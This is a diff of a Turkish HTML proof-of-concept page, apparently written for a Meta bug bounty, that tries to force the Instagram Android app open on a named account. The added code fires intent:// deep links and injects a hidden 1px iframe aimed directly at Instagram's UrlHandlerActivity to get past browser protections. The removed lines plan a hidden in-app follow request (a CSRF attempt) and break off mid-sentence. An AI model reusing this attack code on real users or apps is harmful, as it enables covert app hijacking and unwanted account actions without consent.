@@ -2,23 +2,72 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Meta Bug Bounty - In-App Browser Attack (mehmet383570)</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty PoC - cgnbozkurt</title>
+    <style>
+        body { background-color: #121212; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
+        .box { border: 1px solid #333; padding: 20px; margin-top: 20px; border-radius: 10px; background: #1e1e1e; }
+        .btn {
+            background-color: #ff0055;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        .btn-blue { background-color: #0088cc; }
+        small { color: #888; display: block; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+    <h2>⚡ Instagram Intent Test</h2>
+    <p>Hedef Hesap: <strong>cgnbozkurt</strong></p>
+
+    <div class="box">
+        <h3>YÖNTEM 1: Intent Zorlama</h3>
+        <p>Android sistemine 'Bu profili Instagram ile aç' emrini zorla verir.</p>
+        
+        <script>
+            function forceIntent() {
+                // Hedef Kullanıcı
+                var targetUsername = "cgnbozkurt"; 
+                
+                // Android Intent Scheme
+                // BROWSABLE ve DEFAULT kategorileri ile tarayıcıyı atlatmaya çalışıyoruz.
+                var intent = "intent://user?username=" + targetUsername + "#Intent;scheme=instagram;package=com.instagram.android;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;end";
+                
+                window.location.replace(intent);
+            }
+        </script>
+        
+        <button class="btn" onclick="forceIntent()">PROFİLİ ZORLA AÇ</button>
+    </div>
+
+    <div class="box">
+        <h3>YÖNTEM 2: Iframe/WebView</h3>
+        <p>Arka planda (iframe içinde) tetikleyerek engelleri aşmayı dener.</p>
+        <button class="btn btn-blue" onclick="iframeAttack()">IFRAME İLE SALDIR</button>
+    </div>
+
     <script>
-        const TARGET_USERNAME = "mehmet383570";
-
-        function triggerFollowAction() {
-            // 1. Önce Instagram'ın kendi web şemasıyla kendi URL'mizi uygulamanın içinde açmaya zorlayalım.
-            const selfUrl = "https://mehmetkkk2828.github.io/"; 
-            const instagramWebUri = "instagram://web?url=" + encodeURIComponent(selfUrl);
+        function iframeAttack() {
+            var iframe = document.createElement("iframe");
+            iframe.style.border = "none";
+            iframe.style.width = "1px";
+            iframe.style.height = "1px";
+            var targetUsername = "cgnbozkurt"; 
             
-            window.location.replace(instagramWebUri);
+            // UrlHandlerActivity'yi doğrudan hedefliyoruz
+            iframe.src = "intent://user?username=" + targetUsername + "#Intent;scheme=instagram;package=com.instagram.android;component=com.instagram.android/.activity.UrlHandlerActivity;end";
+            document.body.appendChild(iframe);
+            alert("Iframe enjekte edildi. Uygulama açılırsa kontrol et.");
+        }
+    </script>
 
-            // 2. Eğer bu başarısız olursa, 500ms sonra doğrudan profil deep link'i denenir (Yedek)
-            setTimeout(function() {
-                const profileUri = "instagram://user?username=" + TARGET_USERNAME;
-                window.location.replace(profileUri);
-            }, 500); 
-
-            // 3. (GİZLİ) Uygulama içinde JavaScript kullanarak takip isteği tetikleme (CSRF potansiyeli)
-            // Eğe
+</body>
+</html>
